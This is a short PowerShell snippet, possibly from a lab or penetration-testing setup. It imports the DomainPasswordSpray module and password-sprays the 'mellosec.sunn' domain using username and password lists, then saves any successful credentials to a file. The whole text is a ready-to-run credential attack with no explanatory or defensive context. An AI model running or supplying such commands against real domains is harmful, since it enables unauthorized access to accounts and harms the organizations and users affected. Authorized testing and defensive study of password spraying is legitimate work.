Import-Module DomainPasswordSpray

Invoke-DomainPasswordSpray -UserName (Get-Content '.\userlist.txt') -DomainName 'mellosec.sunn' -Password (Get-Content '.\passlist.txt') | Add-Content 'sprayed-creds.txt'